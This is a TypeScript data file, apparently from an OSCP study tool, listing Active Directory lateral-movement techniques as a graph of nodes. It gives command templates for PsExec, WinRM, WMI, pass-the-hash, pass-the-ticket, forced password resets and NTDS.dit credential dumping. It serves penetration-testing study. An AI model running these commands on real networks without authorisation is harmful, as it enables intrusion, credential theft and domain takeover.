import type { OscpContent } from '@/types/oscp'

/** Phase: Active Directory lateral movement and domain takeover. */
const adLateral: OscpContent = {
    nodes: [
        {
            id: 'psexec-lateral',
            title: 'PsExec / remote exec as SYSTEM',
            type: 'technique',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'With local-admin creds or hash on a host, get a SYSTEM shell over SMB. Noisy but reliable. Accepts -hashes for pass-the-hash and -k for tickets.',
            commands: [
                {
                    label: 'psexec (creds / hash / ticket)',
                    code: `impacket-psexec <domain>/<user>:<pass>@<target>
impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>`,
                },
                {
                    label: 'smbexec / atexec quieter',
                    code: `impacket-smbexec <domain>/<user>:<pass>@<target>
impacket-atexec <domain>/<user>:<pass>@<target> 'whoami'
netexec smb <target> -u <user> -p <pass> -x whoami`,
                },
            ],
            tags: ['psexec', 'smbexec', 'system', 'lateral'],
        },
        {
            id: 'winrm-lateral',
            title: 'WinRM (evil-winrm)',
            type: 'technique',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'If the user is in Remote Management Users (port 5985), evil-winrm gives a clean shell. Supports password and pass-the-hash.',
            commands: [
                {
                    label: 'Connect',
                    code: `evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <NTLM>`,
                },
                {
                    label: 'winrs / Enter-PSSession',
                    code: `winrs -r:<target> -u:<user> -p:<pass> "cmd /c hostname & whoami"
Enter-PSSession -ComputerName <target> -Credential <domain>\\<user>`,
                },
                {
                    label: 'Enable WinRM if 5985 is closed',
                    code: `# from an admin shell on the target:
winrm quickconfig -quiet
Enable-PSRemoting -Force
netexec winrm <target> -u <user> -p <pass>`,
                },
            ],
            tags: ['winrm', 'evil-winrm', '5985', 'lateral'],
        },
        {
            id: 'wmi-lateral',
            title: 'WMI / DCOM execution',
            type: 'technique',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'Quieter than PsExec - no service is created. wmiexec gives a semi-interactive shell as the user.',
            commands: [
                {
                    label: 'wmiexec',
                    code: 'impacket-wmiexec <domain>/<user>:<pass>@<target>',
                },
                {
                    label: 'dcomexec / CIM',
                    code: `impacket-dcomexec <domain>/<user>:<pass>@<target>
# from a domain host:
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<cmd>'} -ComputerName <target>`,
                },
                {
                    label: 'Pass-the-hash WMI',
                    code: `impacket-wmiexec -hashes :<NTLM> <domain>/<user>@<target>
netexec wmi <target> -u <user> -H <NTLM> -x whoami`,
                },
            ],
            tags: ['wmi', 'wmiexec', 'dcom', 'lateral'],
        },
        {
            id: 'force-change-password',
            title: 'Force-change a password (ACL abuse)',
            type: 'technique',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'GenericAll/ForceChangePassword over a target user lets you reset their password, then log in as them - inheriting whatever they can reach.',
            commands: [
                {
                    label: 'Reset via net / rpc',
                    code: `net rpc password "<target-user>" "NewPass123!" -U "<domain>/<you>%<pass>" -S <dc>
# or PowerView: Set-DomainUserPassword -Identity <target> -AccountPassword $sec`,
                },
                {
                    label: 'net user / PowerView',
                    code: `net user <target-user> 'NewPass123!' /domain
Set-DomainUserPassword -Identity <target-user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)`,
                },
            ],
            tags: ['acl', 'genericall', 'forcechangepassword', 'reset'],
        },
        {
            id: 'pass-the-ticket',
            title: 'Pass-the-Ticket',
            type: 'technique',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'Reuse a Kerberos ticket (.ccache / .kirbi) you dumped or forged. Set KRB5CCNAME and run impacket tools with -k -no-pass.',
            commands: [
                {
                    label: 'Use a ccache',
                    code: `export KRB5CCNAME=/path/ticket.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>`,
                },
                {
                    label: 'mimikatz ptt / Rubeus',
                    code: `sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>
Rubeus.exe ptt /ticket:<ticket.kirbi>`,
                },
            ],
            tags: ['ptt', 'ticket', 'kerberos', 'ccache'],
        },
        {
            id: 'domain-admin',
            title: 'Domain Admin / DC owned',
            type: 'state',
            phase: 'ad-lateral',
            os: 'ad',
            description:
                'The objective. You control the domain. Dump NTDS.dit for every hash, grab the flags on the DC, and screenshot proof for the report.',
            commands: [
                {
                    label: 'Dump the whole domain',
                    code: `impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc
# or on the DC: reg save + esentutl NTDS.dit`,
                },
                {
                    label: 'NTDS via vssadmin / ntdsutil',
                    code: `vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .\\ntds.dit
reg save HKLM\\SYSTEM system.save
# Kali:
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL`,
                },
            ],
            tags: ['domain-admin', 'ntds', 'dc', 'win'],
        },
    ],
    edges: [
        { from: 'winrm-lateral', to: 'system-windows', label: 'admin on target' },
        { from: 'winrm-lateral', to: 'ad-foothold', label: 'domain user on a new host' },
        { from: 'psexec-lateral', to: 'system-windows', label: 'SYSTEM on target' },
        { from: 'psexec-lateral', to: 'domain-admin', label: 'target is the DC / DA creds' },
        { from: 'wmi-lateral', to: 'system-windows', label: 'exec on target' },
        { from: 'force-change-password', to: 'creds-found', label: 'now know their password' },
        { from: 'pass-the-ticket', to: 'psexec-lateral', label: 'ticket -> exec' },
        { from: 'creds-found', to: 'wmi-lateral', label: 'try quiet exec' },
    ],
}

export default adLateral
